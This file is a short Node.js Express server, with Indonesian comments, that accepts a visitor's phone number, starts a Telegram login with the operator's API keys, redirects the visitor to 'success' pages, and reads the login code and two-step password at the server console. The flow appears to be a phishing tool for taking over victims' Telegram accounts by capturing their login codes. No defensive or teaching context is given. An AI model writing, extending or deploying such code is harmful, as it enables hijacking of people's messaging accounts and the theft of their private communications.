
const { StringSession } = require("telegram/sessions");
const { TelegramClient } = require("telegram");
const input = require("input");
const express = require("express");
const path = require("path");
const bodyParser = require("body-parser");
require("dotenv").config();

const app = express();
const port = process.env.PORT || 3000;

// Middleware
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, "public")));

// Endpoint untuk login Telegram
app.post("/login", async (req, res) => {
    const { phone } = req.body;
    if (!phone) return res.status(400).send("Phone number is required");

    const client = new TelegramClient(new StringSession(""), parseInt(process.env.API_ID), process.env.API_HASH, {
        connectionRetries: 5,
    });

    try {
        await client.start({
            phoneNumber: async () => phone,
            password: async () => {
                res.redirect("/berhasil3.html");
                return await input.text("Password: ");
            },
            phoneCode: async () => {
                res.redirect("/berhasil4.html");
                return await input.text("Enter the code you received: ");
            },
            onError: (err) => console.log(err),
        });
    } catch (e) {
        console.error(e);
        res.status(500).send("Login failed.");
    }
});

// Start server
app.listen(port, () => {
    console.log(`Server running on http://localhost:${port}`);
});
